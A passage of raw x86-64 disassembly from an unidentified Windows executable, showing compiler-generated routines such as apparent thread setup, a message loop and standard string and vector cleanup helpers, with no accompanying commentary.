   1400043ea:	48 8d 0d ff dd ff ff 	lea    -0x2201(%rip),%rcx        # 0x1400021f0
   1400043f1:	4c 8b c8             	mov    %rax,%r9
   1400043f4:	4c 8d 05 25 1c 00 00 	lea    0x1c25(%rip),%r8        # 0x140006020
   1400043fb:	33 d2                	xor    %edx,%edx
   1400043fd:	48 89 08             	mov    %rcx,(%rax)
   140004400:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140004404:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004409:	33 c9                	xor    %ecx,%ecx
   14000440b:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000440f:	ff 15 fb 40 00 00    	call   *0x40fb(%rip)        # 0x140008510
   140004415:	48 89 45 68          	mov    %rax,0x68(%rbp)
   140004419:	48 85 c0             	test   %rax,%rax
   14000441c:	0f 84 4a 02 00 00    	je     0x14000466c
   140004422:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004427:	e8 7c 25 00 00       	call   0x1400069a8
   14000442c:	48 8d 0d 6d ed ff ff 	lea    -0x1293(%rip),%rcx        # 0x1400031a0
   140004433:	4c 8b c8             	mov    %rax,%r9
   140004436:	4c 8d 05 e3 1b 00 00 	lea    0x1be3(%rip),%r8        # 0x140006020
   14000443d:	33 d2                	xor    %edx,%edx
   14000443f:	48 89 08             	mov    %rcx,(%rax)
   140004442:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140004446:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000444b:	33 c9                	xor    %ecx,%ecx
   14000444d:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004451:	ff 15 b9 40 00 00    	call   *0x40b9(%rip)        # 0x140008510
   140004457:	48 89 45 58          	mov    %rax,0x58(%rbp)
   14000445b:	48 85 c0             	test   %rax,%rax
   14000445e:	0f 84 f9 01 00 00    	je     0x14000465d
   140004464:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004469:	e8 3a 25 00 00       	call   0x1400069a8
   14000446e:	48 8d 15 5b f2 ff ff 	lea    -0xda5(%rip),%rdx        # 0x1400036d0
   140004475:	4c 8b c8             	mov    %rax,%r9
   140004478:	4c 8d 05 a1 1b 00 00 	lea    0x1ba1(%rip),%r8        # 0x140006020
   14000447f:	33 c9                	xor    %ecx,%ecx
   140004481:	48 89 10             	mov    %rdx,(%rax)
   140004484:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   140004488:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000448d:	33 d2                	xor    %edx,%edx
   14000448f:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004493:	ff 15 77 40 00 00    	call   *0x4077(%rip)        # 0x140008510
   140004499:	48 89 45 48          	mov    %rax,0x48(%rbp)
   14000449d:	48 85 c0             	test   %rax,%rax
   1400044a0:	0f 84 a8 01 00 00    	je     0x14000464e
   1400044a6:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400044ab:	e8 f8 24 00 00       	call   0x1400069a8
   1400044b0:	48 8d 0d 09 e9 ff ff 	lea    -0x16f7(%rip),%rcx        # 0x140002dc0
   1400044b7:	4c 8b c8             	mov    %rax,%r9
   1400044ba:	4c 8d 05 5f 1b 00 00 	lea    0x1b5f(%rip),%r8        # 0x140006020
   1400044c1:	33 d2                	xor    %edx,%edx
   1400044c3:	48 89 08             	mov    %rcx,(%rax)
   1400044c6:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   1400044ca:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400044cf:	33 c9                	xor    %ecx,%ecx
   1400044d1:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400044d5:	ff 15 35 40 00 00    	call   *0x4035(%rip)        # 0x140008510
   1400044db:	48 89 45 38          	mov    %rax,0x38(%rbp)
   1400044df:	48 85 c0             	test   %rax,%rax
   1400044e2:	0f 84 57 01 00 00    	je     0x14000463f
   1400044e8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400044eb:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   1400044f2:	45 33 c9             	xor    %r9d,%r9d
   1400044f5:	45 33 c0             	xor    %r8d,%r8d
   1400044f8:	33 d2                	xor    %edx,%edx
   1400044fa:	0f 11 85 58 01 00 00 	movups %xmm0,0x158(%rbp)
   140004501:	0f 11 85 68 01 00 00 	movups %xmm0,0x168(%rbp)
   140004508:	0f 11 85 78 01 00 00 	movups %xmm0,0x178(%rbp)
   14000450f:	ff 15 1b 3e 00 00    	call   *0x3e1b(%rip)        # 0x140008330
   140004515:	85 c0                	test   %eax,%eax
   140004517:	74 43                	je     0x14000455c
   140004519:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004520:	40 38 35 8d 8b 00 00 	cmp    %sil,0x8b8d(%rip)        # 0x14000d0b4
   140004527:	74 33                	je     0x14000455c
   140004529:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   140004530:	ff 15 82 3e 00 00    	call   *0x3e82(%rip)        # 0x1400083b8
   140004536:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   14000453d:	ff 15 35 3e 00 00    	call   *0x3e35(%rip)        # 0x140008378
   140004543:	45 33 c9             	xor    %r9d,%r9d
   140004546:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   14000454d:	45 33 c0             	xor    %r8d,%r8d
   140004550:	33 d2                	xor    %edx,%edx
   140004552:	ff 15 d8 3d 00 00    	call   *0x3dd8(%rip)        # 0x140008330
   140004558:	85 c0                	test   %eax,%eax
   14000455a:	75 c4                	jne    0x140004520
   14000455c:	ba 01 00 00 00       	mov    $0x1,%edx
   140004561:	48 8b cf             	mov    %rdi,%rcx
   140004564:	ff 15 96 3d 00 00    	call   *0x3d96(%rip)        # 0x140008300
   14000456a:	39 75 40             	cmp    %esi,0x40(%rbp)
   14000456d:	0f 85 c5 00 00 00    	jne    0x140004638
   140004573:	39 75 50             	cmp    %esi,0x50(%rbp)
   140004576:	0f 85 bc 00 00 00    	jne    0x140004638
   14000457c:	39 75 60             	cmp    %esi,0x60(%rbp)
   14000457f:	0f 85 b3 00 00 00    	jne    0x140004638
   140004585:	39 75 70             	cmp    %esi,0x70(%rbp)
   140004588:	0f 85 aa 00 00 00    	jne    0x140004638
   14000458e:	39 b5 80 00 00 00    	cmp    %esi,0x80(%rbp)
   140004594:	0f 85 9e 00 00 00    	jne    0x140004638
   14000459a:	39 b5 90 00 00 00    	cmp    %esi,0x90(%rbp)
   1400045a0:	0f 85 92 00 00 00    	jne    0x140004638
   1400045a6:	39 b5 a0 00 00 00    	cmp    %esi,0xa0(%rbp)
   1400045ac:	0f 85 86 00 00 00    	jne    0x140004638
   1400045b2:	39 b5 b0 00 00 00    	cmp    %esi,0xb0(%rbp)
   1400045b8:	75 7e                	jne    0x140004638
   1400045ba:	39 b5 c0 00 00 00    	cmp    %esi,0xc0(%rbp)
   1400045c0:	75 76                	jne    0x140004638
   1400045c2:	39 b5 d0 00 00 00    	cmp    %esi,0xd0(%rbp)
   1400045c8:	75 6e                	jne    0x140004638
   1400045ca:	39 b5 e0 00 00 00    	cmp    %esi,0xe0(%rbp)
   1400045d0:	75 66                	jne    0x140004638
   1400045d2:	39 b5 f0 00 00 00    	cmp    %esi,0xf0(%rbp)
   1400045d8:	75 5e                	jne    0x140004638
   1400045da:	39 b5 00 01 00 00    	cmp    %esi,0x100(%rbp)
   1400045e0:	75 56                	jne    0x140004638
   1400045e2:	39 b5 10 01 00 00    	cmp    %esi,0x110(%rbp)
   1400045e8:	75 4e                	jne    0x140004638
   1400045ea:	39 b5 20 01 00 00    	cmp    %esi,0x120(%rbp)
   1400045f0:	75 46                	jne    0x140004638
   1400045f2:	39 b5 30 01 00 00    	cmp    %esi,0x130(%rbp)
   1400045f8:	75 3e                	jne    0x140004638
   1400045fa:	39 b5 40 01 00 00    	cmp    %esi,0x140(%rbp)
   140004600:	75 36                	jne    0x140004638
   140004602:	39 b5 50 01 00 00    	cmp    %esi,0x150(%rbp)
   140004608:	75 2e                	jne    0x140004638
   14000460a:	33 c0                	xor    %eax,%eax
   14000460c:	48 8b 8d d0 09 00 00 	mov    0x9d0(%rbp),%rcx
   140004613:	48 33 cc             	xor    %rsp,%rcx
   140004616:	e8 65 23 00 00       	call   0x140006980
   14000461b:	4c 8d 9c 24 e0 0a 00 	lea    0xae0(%rsp),%r11
   140004622:	00 
   140004623:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140004627:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000462b:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   14000462f:	49 8b e3             	mov    %r11,%rsp
   140004632:	41 5f                	pop    %r15
   140004634:	41 5e                	pop    %r14
   140004636:	5d                   	pop    %rbp
   140004637:	c3                   	ret
   140004638:	ff 15 fa 3e 00 00    	call   *0x3efa(%rip)        # 0x140008538
   14000463e:	cc                   	int3
   14000463f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004644:	89 75 40             	mov    %esi,0x40(%rbp)
   140004647:	ff 15 a3 3b 00 00    	call   *0x3ba3(%rip)        # 0x1400081f0
   14000464d:	cc                   	int3
   14000464e:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004653:	89 75 50             	mov    %esi,0x50(%rbp)
   140004656:	ff 15 94 3b 00 00    	call   *0x3b94(%rip)        # 0x1400081f0
   14000465c:	cc                   	int3
   14000465d:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004662:	89 75 60             	mov    %esi,0x60(%rbp)
   140004665:	ff 15 85 3b 00 00    	call   *0x3b85(%rip)        # 0x1400081f0
   14000466b:	cc                   	int3
   14000466c:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004671:	89 75 70             	mov    %esi,0x70(%rbp)
   140004674:	ff 15 76 3b 00 00    	call   *0x3b76(%rip)        # 0x1400081f0
   14000467a:	cc                   	int3
   14000467b:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004680:	89 b5 80 00 00 00    	mov    %esi,0x80(%rbp)
   140004686:	ff 15 64 3b 00 00    	call   *0x3b64(%rip)        # 0x1400081f0
   14000468c:	cc                   	int3
   14000468d:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004692:	89 b5 90 00 00 00    	mov    %esi,0x90(%rbp)
   140004698:	ff 15 52 3b 00 00    	call   *0x3b52(%rip)        # 0x1400081f0
   14000469e:	cc                   	int3
   14000469f:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400046a4:	89 b5 a0 00 00 00    	mov    %esi,0xa0(%rbp)
   1400046aa:	ff 15 40 3b 00 00    	call   *0x3b40(%rip)        # 0x1400081f0
   1400046b0:	cc                   	int3
   1400046b1:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400046b6:	89 b5 b0 00 00 00    	mov    %esi,0xb0(%rbp)
   1400046bc:	ff 15 2e 3b 00 00    	call   *0x3b2e(%rip)        # 0x1400081f0
   1400046c2:	cc                   	int3
   1400046c3:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400046c8:	89 b5 c0 00 00 00    	mov    %esi,0xc0(%rbp)
   1400046ce:	ff 15 1c 3b 00 00    	call   *0x3b1c(%rip)        # 0x1400081f0
   1400046d4:	cc                   	int3
   1400046d5:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400046da:	89 b5 d0 00 00 00    	mov    %esi,0xd0(%rbp)
   1400046e0:	ff 15 0a 3b 00 00    	call   *0x3b0a(%rip)        # 0x1400081f0
   1400046e6:	cc                   	int3
   1400046e7:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400046ec:	89 b5 e0 00 00 00    	mov    %esi,0xe0(%rbp)
   1400046f2:	ff 15 f8 3a 00 00    	call   *0x3af8(%rip)        # 0x1400081f0
   1400046f8:	cc                   	int3
   1400046f9:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400046fe:	89 b5 f0 00 00 00    	mov    %esi,0xf0(%rbp)
   140004704:	ff 15 e6 3a 00 00    	call   *0x3ae6(%rip)        # 0x1400081f0
   14000470a:	cc                   	int3
   14000470b:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004710:	89 b5 00 01 00 00    	mov    %esi,0x100(%rbp)
   140004716:	ff 15 d4 3a 00 00    	call   *0x3ad4(%rip)        # 0x1400081f0
   14000471c:	cc                   	int3
   14000471d:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004722:	89 b5 10 01 00 00    	mov    %esi,0x110(%rbp)
   140004728:	ff 15 c2 3a 00 00    	call   *0x3ac2(%rip)        # 0x1400081f0
   14000472e:	cc                   	int3
   14000472f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004734:	89 b5 20 01 00 00    	mov    %esi,0x120(%rbp)
   14000473a:	ff 15 b0 3a 00 00    	call   *0x3ab0(%rip)        # 0x1400081f0
   140004740:	cc                   	int3
   140004741:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004746:	89 b5 30 01 00 00    	mov    %esi,0x130(%rbp)
   14000474c:	ff 15 9e 3a 00 00    	call   *0x3a9e(%rip)        # 0x1400081f0
   140004752:	cc                   	int3
   140004753:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004758:	89 b5 40 01 00 00    	mov    %esi,0x140(%rbp)
   14000475e:	ff 15 8c 3a 00 00    	call   *0x3a8c(%rip)        # 0x1400081f0
   140004764:	cc                   	int3
   140004765:	b9 06 00 00 00       	mov    $0x6,%ecx
   14000476a:	89 b5 50 01 00 00    	mov    %esi,0x150(%rbp)
   140004770:	ff 15 7a 3a 00 00    	call   *0x3a7a(%rip)        # 0x1400081f0
   140004776:	cc                   	int3
   140004777:	cc                   	int3
   140004778:	cc                   	int3
   140004779:	cc                   	int3
   14000477a:	cc                   	int3
   14000477b:	cc                   	int3
   14000477c:	cc                   	int3
   14000477d:	cc                   	int3
   14000477e:	cc                   	int3
   14000477f:	cc                   	int3
   140004780:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004785:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000478a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000478f:	53                   	push   %rbx
   140004790:	56                   	push   %rsi
   140004791:	57                   	push   %rdi
   140004792:	48 83 ec 30          	sub    $0x30,%rsp
   140004796:	48 8b fa             	mov    %rdx,%rdi
   140004799:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   14000479e:	48 8b d9             	mov    %rcx,%rbx
   1400047a1:	e8 6a c8 ff ff       	call   0x140001010
   1400047a6:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400047ab:	4c 8b cf             	mov    %rdi,%r9
   1400047ae:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400047b4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400047bb:	00 00 
   1400047bd:	48 8b d3             	mov    %rbx,%rdx
   1400047c0:	48 8b 08             	mov    (%rax),%rcx
   1400047c3:	ff 15 cf 3d 00 00    	call   *0x3dcf(%rip)        # 0x140008598
   1400047c9:	85 c0                	test   %eax,%eax
   1400047cb:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400047d0:	0f 48 c1             	cmovs  %ecx,%eax
   1400047d3:	48 83 c4 30          	add    $0x30,%rsp
   1400047d7:	5f                   	pop    %rdi
   1400047d8:	5e                   	pop    %rsi
   1400047d9:	5b                   	pop    %rbx
   1400047da:	c3                   	ret
   1400047db:	cc                   	int3
   1400047dc:	cc                   	int3
   1400047dd:	cc                   	int3
   1400047de:	cc                   	int3
   1400047df:	cc                   	int3
   1400047e0:	e9 eb 15 00 00       	jmp    0x140005dd0
   1400047e5:	cc                   	int3
   1400047e6:	cc                   	int3
   1400047e7:	cc                   	int3
   1400047e8:	cc                   	int3
   1400047e9:	cc                   	int3
   1400047ea:	cc                   	int3
   1400047eb:	cc                   	int3
   1400047ec:	cc                   	int3
   1400047ed:	cc                   	int3
   1400047ee:	cc                   	int3
   1400047ef:	cc                   	int3
   1400047f0:	40 53                	rex push %rbx
   1400047f2:	48 83 ec 30          	sub    $0x30,%rsp
   1400047f6:	48 8b d9             	mov    %rcx,%rbx
   1400047f9:	48 8b 09             	mov    (%rcx),%rcx
   1400047fc:	48 85 c9             	test   %rcx,%rcx
   1400047ff:	74 3a                	je     0x14000483b
   140004801:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140004805:	48 2b d1             	sub    %rcx,%rdx
   140004808:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000480f:	72 18                	jb     0x140004829
   140004811:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004815:	48 83 c2 27          	add    $0x27,%rdx
   140004819:	48 2b c8             	sub    %rax,%rcx
   14000481c:	48 83 e9 08          	sub    $0x8,%rcx
   140004820:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004824:	77 1b                	ja     0x140004841
   140004826:	48 8b c8             	mov    %rax,%rcx
   140004829:	e8 72 21 00 00       	call   0x1400069a0
   14000482e:	33 c0                	xor    %eax,%eax
   140004830:	48 89 03             	mov    %rax,(%rbx)
   140004833:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140004837:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000483b:	48 83 c4 30          	add    $0x30,%rsp
   14000483f:	5b                   	pop    %rbx
   140004840:	c3                   	ret
   140004841:	33 c0                	xor    %eax,%eax
   140004843:	45 33 c9             	xor    %r9d,%r9d
   140004846:	45 33 c0             	xor    %r8d,%r8d
   140004849:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000484e:	33 d2                	xor    %edx,%edx
   140004850:	33 c9                	xor    %ecx,%ecx
   140004852:	ff 15 68 3c 00 00    	call   *0x3c68(%rip)        # 0x1400084c0
   140004858:	cc                   	int3
   140004859:	cc                   	int3
   14000485a:	cc                   	int3
   14000485b:	cc                   	int3
   14000485c:	cc                   	int3
   14000485d:	cc                   	int3
   14000485e:	cc                   	int3
   14000485f:	cc                   	int3
   140004860:	40 53                	rex push %rbx
   140004862:	48 83 ec 30          	sub    $0x30,%rsp
   140004866:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   14000486a:	48 8b d9             	mov    %rcx,%rbx
   14000486d:	48 83 fa 07          	cmp    $0x7,%rdx
   140004871:	76 31                	jbe    0x1400048a4
   140004873:	48 8b 09             	mov    (%rcx),%rcx
   140004876:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000487d:	00 
   14000487e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004885:	72 18                	jb     0x14000489f
   140004887:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   14000488b:	48 83 c2 27          	add    $0x27,%rdx
   14000488f:	48 2b c8             	sub    %rax,%rcx
   140004892:	48 83 e9 08          	sub    $0x8,%rcx
   140004896:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000489a:	77 1f                	ja     0x1400048bb
   14000489c:	48 8b c8             	mov    %rax,%rcx
   14000489f:	e8 fc 20 00 00       	call   0x1400069a0
   1400048a4:	33 c0                	xor    %eax,%eax
   1400048a6:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   1400048ad:	00 
   1400048ae:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400048b2:	66 89 03             	mov    %ax,(%rbx)
   1400048b5:	48 83 c4 30          	add    $0x30,%rsp
   1400048b9:	5b                   	pop    %rbx
   1400048ba:	c3                   	ret
   1400048bb:	33 c0                	xor    %eax,%eax
   1400048bd:	45 33 c9             	xor    %r9d,%r9d
   1400048c0:	45 33 c0             	xor    %r8d,%r8d
   1400048c3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400048c8:	33 d2                	xor    %edx,%edx
   1400048ca:	33 c9                	xor    %ecx,%ecx
   1400048cc:	ff 15 ee 3b 00 00    	call   *0x3bee(%rip)        # 0x1400084c0
   1400048d2:	cc                   	int3
   1400048d3:	cc                   	int3
   1400048d4:	cc                   	int3
   1400048d5:	cc                   	int3
   1400048d6:	cc                   	int3
   1400048d7:	cc                   	int3
   1400048d8:	cc                   	int3
   1400048d9:	cc                   	int3
   1400048da:	cc                   	int3
   1400048db:	cc                   	int3
   1400048dc:	cc                   	int3
   1400048dd:	cc                   	int3
   1400048de:	cc                   	int3
   1400048df:	cc                   	int3
   1400048e0:	40 53                	rex push %rbx
   1400048e2:	55                   	push   %rbp
   1400048e3:	56                   	push   %rsi
   1400048e4:	41 56                	push   %r14
   1400048e6:	41 57                	push   %r15
   1400048e8:	48 83 ec 30          	sub    $0x30,%rsp
   1400048ec:	45 33 ff             	xor    %r15d,%r15d
   1400048ef:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400048f2:	0f 11 01             	movups %xmm0,(%rcx)
   1400048f5:	4c 89 79 10          	mov    %r15,0x10(%rcx)
   1400048f9:	48 8b ea             	mov    %rdx,%rbp
   1400048fc:	4c 89 79 18          	mov    %r15,0x18(%rcx)
   140004900:	48 8b f1             	mov    %rcx,%rsi
   140004903:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   14000490a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004910:	48 ff c3             	inc    %rbx
   140004913:	66 44 39 3c 5a       	cmp    %r15w,(%rdx,%rbx,2)
   140004918:	75 f6                	jne    0x140004910
   14000491a:	49 be fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r14
   140004921:	ff ff 7f 
   140004924:	49 3b de             	cmp    %r14,%rbx
   140004927:	0f 87 f6 00 00 00    	ja     0x140004a23
   14000492d:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140004932:	48 83 fb 07          	cmp    $0x7,%rbx
   140004936:	77 21                	ja     0x140004959
   140004938:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   14000493c:	48 03 db             	add    %rbx,%rbx
   14000493f:	4c 8b c3             	mov    %rbx,%r8
   140004942:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140004949:	00 
   14000494a:	e8 bc 30 00 00       	call   0x140007a0b
   14000494f:	66 44 89 3c 33       	mov    %r15w,(%rbx,%rsi,1)
   140004954:	e9 b6 00 00 00       	jmp    0x140004a0f
   140004959:	48 8b c3             	mov    %rbx,%rax
   14000495c:	48 83 c8 07          	or     $0x7,%rax
   140004960:	49 3b c6             	cmp    %r14,%rax
   140004963:	76 47                	jbe    0x1400049ac
   140004965:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000496c:	ff ff 7f 
   14000496f:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140004973:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   14000497a:	72 6a                	jb     0x1400049e6
   14000497c:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140004980:	48 3b c1             	cmp    %rcx,%rax
   140004983:	0f 86 a0 00 00 00    	jbe    0x140004a29
   140004989:	48 8b c8             	mov    %rax,%rcx
   14000498c:	e8 17 20 00 00       	call   0x1400069a8
   140004991:	48 85 c0             	test   %rax,%rax
   140004994:	75 42                	jne    0x1400049d8
   140004996:	45 33 c9             	xor    %r9d,%r9d
   140004999:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000499e:	45 33 c0             	xor    %r8d,%r8d
   1400049a1:	33 d2                	xor    %edx,%edx
   1400049a3:	33 c9                	xor    %ecx,%ecx
   1400049a5:	ff 15 15 3b 00 00    	call   *0x3b15(%rip)        # 0x1400084c0
   1400049ab:	cc                   	int3
   1400049ac:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400049b1:	4c 8b f0             	mov    %rax,%r14
   1400049b4:	48 3b c1             	cmp    %rcx,%rax
   1400049b7:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400049be:	ff ff 7f 
   1400049c1:	4c 0f 42 f1          	cmovb  %rcx,%r14
   1400049c5:	49 8d 4e 01          	lea    0x1(%r14),%rcx
   1400049c9:	48 3b c8             	cmp    %rax,%rcx
   1400049cc:	77 5b                	ja     0x140004a29
   1400049ce:	48 03 c9             	add    %rcx,%rcx
   1400049d1:	75 a0                	jne    0x140004973
   1400049d3:	49 8b ff             	mov    %r15,%rdi
   1400049d6:	eb 16                	jmp    0x1400049ee
   1400049d8:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1400049dc:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1400049e0:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1400049e4:	eb 08                	jmp    0x1400049ee
   1400049e6:	e8 bd 1f 00 00       	call   0x1400069a8
   1400049eb:	48 8b f8             	mov    %rax,%rdi
   1400049ee:	48 89 5e 10          	mov    %rbx,0x10(%rsi)
   1400049f2:	48 8b d5             	mov    %rbp,%rdx
   1400049f5:	48 03 db             	add    %rbx,%rbx
   1400049f8:	48 89 3e             	mov    %rdi,(%rsi)
   1400049fb:	4c 8b c3             	mov    %rbx,%r8
   1400049fe:	4c 89 76 18          	mov    %r14,0x18(%rsi)
   140004a02:	48 8b cf             	mov    %rdi,%rcx
   140004a05:	e8 01 30 00 00       	call   0x140007a0b
   140004a0a:	66 44 89 3c 3b       	mov    %r15w,(%rbx,%rdi,1)
   140004a0f:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140004a14:	48 8b c6             	mov    %rsi,%rax
   140004a17:	48 83 c4 30          	add    $0x30,%rsp
   140004a1b:	41 5f                	pop    %r15
   140004a1d:	41 5e                	pop    %r14
   140004a1f:	5e                   	pop    %rsi
   140004a20:	5d                   	pop    %rbp
   140004a21:	5b                   	pop    %rbx
   140004a22:	c3                   	ret
   140004a23:	e8 88 c9 ff ff       	call   0x1400013b0
   140004a28:	cc                   	int3
   140004a29:	e8 62 c8 ff ff       	call   0x140001290
   140004a2e:	cc                   	int3
   140004a2f:	cc                   	int3
   140004a30:	40 53                	rex push %rbx
   140004a32:	48 83 ec 30          	sub    $0x30,%rsp
   140004a36:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140004a3a:	48 8b d9             	mov    %rcx,%rbx
   140004a3d:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004a41:	76 2c                	jbe    0x140004a6f
   140004a43:	48 8b 09             	mov    (%rcx),%rcx
   140004a46:	48 ff c2             	inc    %rdx
   140004a49:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004a50:	72 18                	jb     0x140004a6a
   140004a52:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004a56:	48 83 c2 27          	add    $0x27,%rdx
   140004a5a:	48 2b c8             	sub    %rax,%rcx
   140004a5d:	48 83 e9 08          	sub    $0x8,%rcx
   140004a61:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004a65:	77 21                	ja     0x140004a88
   140004a67:	48 8b c8             	mov    %rax,%rcx
   140004a6a:	e8 31 1f 00 00       	call   0x1400069a0
   140004a6f:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   140004a76:	00 
   140004a77:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140004a7e:	00 
   140004a7f:	c6 03 00             	movb   $0x0,(%rbx)
   140004a82:	48 83 c4 30          	add    $0x30,%rsp
   140004a86:	5b                   	pop    %rbx
   140004a87:	c3                   	ret
   140004a88:	45 33 c9             	xor    %r9d,%r9d
   140004a8b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004a92:	00 00 
   140004a94:	45 33 c0             	xor    %r8d,%r8d
   140004a97:	33 d2                	xor    %edx,%edx
   140004a99:	33 c9                	xor    %ecx,%ecx
   140004a9b:	ff 15 1f 3a 00 00    	call   *0x3a1f(%rip)        # 0x1400084c0
   140004aa1:	cc                   	int3
   140004aa2:	cc                   	int3
   140004aa3:	cc                   	int3
   140004aa4:	cc                   	int3
   140004aa5:	cc                   	int3
   140004aa6:	cc                   	int3
   140004aa7:	cc                   	int3
   140004aa8:	cc                   	int3
   140004aa9:	cc                   	int3
   140004aaa:	cc                   	int3
   140004aab:	cc                   	int3
   140004aac:	cc                   	int3
   140004aad:	cc                   	int3
   140004aae:	cc                   	int3
   140004aaf:	cc                   	int3
   140004ab0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004ab5:	55                   	push   %rbp
   140004ab6:	56                   	push   %rsi
   140004ab7:	57                   	push   %rdi
   140004ab8:	48 83 ec 70          	sub    $0x70,%rsp
   140004abc:	48 8b 05 7d 85 00 00 	mov    0x857d(%rip),%rax        # 0x14000d040
   140004ac3:	48 33 c4             	xor    %rsp,%rax
   140004ac6:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004acb:	48 8b da             	mov    %rdx,%rbx
   140004ace:	48 8b f1             	mov    %rcx,%rsi
   140004ad1:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004ad6:	33 ed                	xor    %ebp,%ebp
   140004ad8:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   140004adc:	48 8d 05 35 46 00 00 	lea    0x4635(%rip),%rax        # 0x140009118
   140004ae3:	48 89 01             	mov    %rax,(%rcx)
   140004ae6:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   140004aed:	ff 15 75 37 00 00    	call   *0x3775(%rip)        # 0x140008268
   140004af3:	90                   	nop
   140004af4:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140004afb:	00 
   140004afc:	48 8d 7e 08          	lea    0x8(%rsi),%rdi
   140004b00:	45 33 c9             	xor    %r9d,%r9d
   140004b03:	45 33 c0             	xor    %r8d,%r8d
   140004b06:	48 8b d7             	mov    %rdi,%rdx
   140004b09:	48 8b ce             	mov    %rsi,%rcx
